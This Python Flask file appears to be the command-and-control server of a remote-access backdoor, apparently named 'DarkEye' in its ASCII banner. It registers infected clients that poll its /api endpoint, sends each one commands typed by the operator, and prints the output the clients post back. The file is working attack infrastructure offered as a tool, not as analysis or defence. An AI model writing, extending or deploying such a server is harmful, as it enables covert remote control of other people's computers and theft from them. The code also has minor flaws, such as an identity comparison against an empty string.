from flask import Flask, request

app = Flask(__name__)

IP = "x.x.x.x"

startup = " _____              _     _______            \n(____ \            | |   (_______)           \n _   \ \ ____  ____| |  _ _____  _   _  ____ \n| |   | / _  |/ ___) | / )  ___)| | | |/ _  )\n| |__/ ( ( | | |   | |< (| |____| |_| ( (/ / \n|_____/ \_||_|_|   |_| \_)_______)__  |\____)\n                                (____/       \n"
print(startup)

registered_ids = []
online_ids = []


@app.route("/api", methods=["GET", "POST"])
def handle_requests():
    if request.method == "GET":
        data = str(request.data.decode("utf-8").strip())
        if data not in registered_ids:
            registered_ids.append(data)
            online_ids.append(data)
            print(f"New client joined. ({data})")
        if data not in online_ids:
            online_ids.append(data)
            print(f"{data} is online.")
        cmd = input(f"{data} >>> ")
        return cmd
    elif request.method == "POST":
        data = [x.strip() for x in request.data.decode("utf-8").strip().split(";;; ")]
        data.append("")
        if data[1] == "!exit!":
            print(f"{data[0]} logged off.")
            online_ids.remove(data[0])
        elif data[1] is not "":
            print(f"{data[0]}: {data[1]}")
        return "."


if __name__ == "__main__":
    app.run(debug=False, host=IP)
